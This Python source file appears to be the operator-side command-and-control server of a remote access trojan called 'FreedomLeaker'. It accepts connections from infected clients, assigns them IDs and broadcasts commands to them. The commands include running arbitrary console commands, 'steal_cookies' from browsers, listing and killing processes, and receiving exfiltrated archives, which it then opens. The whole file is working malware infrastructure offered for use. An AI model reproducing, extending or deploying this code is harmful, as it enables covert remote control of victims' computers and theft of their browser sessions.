import socket, threading, random, os

HOST = "127.0.0.1"  
PORT = 65172 
conns = []
cmds = [
    {'Name_and_args': 'os_use_cmd <uid> <command and args>', 'Description': 'run a console command'},
    {'Name_and_args': '?', 'Description': 'show help page'},
    {'Name_and_args': 'get_clients', 'Description': 'get all clients'},
    {'Name_and_args': 'steal_cookies <uid>', 'Description': 'steal cookies from browsers'},
    {'Name_and_args': 'get_tasklist <uid>', 'Description': 'get tasklist from pc'},
    {'Name_and_args': 'kill_process <uid> <name.exe>', 'Description': 'kill a process'},
    
]

def ListenForData(conn, addr):

    global conns

    try:

        while True:

            data = conn.recv(64000)

            if not data:
                break

            data = data.decode('cp1251')

            data = str(data) # VSC is white without it, sorry for this shit!!!

            if len(data.split())>0:

                res = data.split()

            if data.startswith('Connected || by FreedomLeaker (Sonys9 github) || '):

                ip = data.split()[-1]

                for b in conns:
                    
                    if b['conn'] != conn: continue
                    b['ip'] = ip
                    uid = b['uid']

                print(f'\nClient {ip} connected!')

                SendCmd(f'SETUID {uid}', conn)
            
            if data.split()[0] == 'LOG':

                res.pop(0)

                toprint = ' '.join(res)

                print(f'\nLog: {toprint}')

            if data.split()[0] == 'TASKLIST':
                
                res.pop(0)

                toprint = ' '.join(res)

                print(toprint.replace('|||', '\n'))                

            if data.split()[0] == 'CMDOUTPUT':

                res.pop(0)

                toprint = ' '.join(res)

                print(f'\nCmd result: {toprint}')

            if data.split()[0] == 'SFTRUE123':

                data = data.split()
                data.pop(0)
                filename = data[-1]
                
                with open(filename.replace('\\', '/').split('/')[-1], 'wb') as f:

                    while True:

                        dataorig = conn.recv(64000)

                        if dataorig == b'SFFALSE123': 
                            print(f'Downloaded an archive')
                            os.system(f'start {filename}')
                            break

                        print(f'got {len(dataorig)} bytes')

                        f.write(dataorig)

                        f.flush()

            print('\nEnter your command (? for help):\t')

    except ConnectionResetError:

        for b in conns:
            if b['conn'] == conn: 
                print(f"\nClient {b["uid"]} closed!\nEnter your command (? for help):\t")
                conns.remove(b)
        conn.close()

    except Exception as e:

        print(f'\nError: {e}')

def SendCmd(text: str, conn):

    conn.sendall(b'[SRV] '+text.encode())

def GetHelp(): 

    res = ''
    
    for cmd in cmds:

        res+=f'\n{cmd["Name_and_args"]} - {cmd["Description"]}'

    return f'Help page:{res}'

def InputCMD():

    global conns

    while True:

        cmd = input('Enter your command (? for help):\t').strip()

        if cmd:

            for cmdd in cmds:

                if cmdd['Name_and_args'].split()[0] == cmd.split()[0]: break

            else: 
                
                print(f'\nUnknown command. Type ? for help.')

                continue

            if cmd == '?': print(GetHelp())
            elif cmd == 'get_clients':

                for i,b in enumerate(conns, start=1): print(f'{i}: {b["uid"]} - {b["ip"]}')
            
            else: 
                for conn in conns:
                    try:
                        SendCmd(cmd, conn['conn'])
                        #print(f'\nSent to {conn["uid"]}: {cmd}')
                    except Exception as e:
                        print(f'\nFailed to send to {conn["uid"]}: {e}')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen()

threading.Thread(target=InputCMD).start()

while True:
    try:
        conn, addr = s.accept()
        #print(f"Connected by {addr}")
        conns.append({'conn': conn, 'ip': "???", 'uid': str(random.randint(100000000,999999999))})
        threading.Thread(target=ListenForData, args=(conn,addr,)).start()
    except Exception as e:
        print(f'\nError: {e}')